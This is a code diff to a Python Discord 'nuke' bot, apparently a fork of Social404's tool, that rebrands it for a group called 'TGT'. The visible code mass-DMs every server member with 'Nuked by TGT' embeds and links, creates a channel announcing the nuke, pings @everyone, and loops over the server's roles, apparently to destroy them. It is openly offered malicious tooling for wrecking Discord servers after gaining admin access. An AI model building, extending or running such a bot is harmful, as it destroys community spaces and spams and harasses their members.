@@ -19,7 +19,7 @@ client.remove_command("help")
 
 @client.event
 async def on_ready():
-    print ("Ah shit, here we go again")
+    print ("TGT ON TOP")
 
 @client.event
 async def on_server_join(server):
@@ -95,24 +95,24 @@ async def mall(ctx):
     for member in list(client.get_all_members()):
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
+            embed = discord.Embed(title="Nuked by TGT!", url="https://www.youtube.com/@t.g.tofficial8438", description="We nuked your server sorry not sorry!" , color=discord.Colour.purple())
             embed.add_field(
                 name="Discord Server",
                 value=
-                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
+                "[ [ Click here ] ](https://discord.gg/WHrgAuqdae)",
                 inline=False)
             embed.add_field(
                 name="Youtube Channel",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
+                "[ [ Click here ] ](https://www.youtube.com/@t.g.tofficial8438)",
                 inline=False)
             embed.add_field(
-                name="GitHub",
+                name="",
                 value=
-                "[ [ Click here ] ](https://github.com/social404)",
+                "[ [ Click here ] ]()",
                 inline=False)
-            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_thumbnail(url="")
+            embed.set_footer(text="Nuked By TGT Sorry About Your Loss")
             await member.send(embed=embed)
         except:
             pass
@@ -126,24 +126,24 @@ async def destroy(ctx):
     for member in list(client.get_all_members()): 
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
+            embed = discord.Embed(title="GLORY TO TGT", url="https://discord.gg/WHrgAuqdae", description="They Nuke Your Server L " , color=discord.Colour.purple())
             embed.add_field(
                 name="Discord Server",
                 value=
-                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
+                "[ [ Click here ] ](https://discord.gg/WHrgAuqdae)",
                 inline=False)
             embed.add_field(
-                name="Youtube Channel",
+                name="DISCORD",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
+                "[ [ Click here ] ](https://discord.gg/WHrgAuqdae)",
                 inline=False)
             embed.add_field(
-                name="GitHub",
+                name="DISCORD",
                 value=
-                "[ [ Click here ] ](https://github.com/social404)",
+                "[ [ Click here ] ](https://discord.gg/WHrgAuqdae)",
                 inline=False)
-            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_thumbnail(url="")
+            embed.set_footer(text="Nuked By TGT")
             await member.send(embed=embed)
         except:
             pass
@@ -155,8 +155,8 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
-        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
+        channel = await guild.create_text_channel("Nuked By TGT")
+        await channel.send(" @everyone NUKED BY TGT")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
         try:
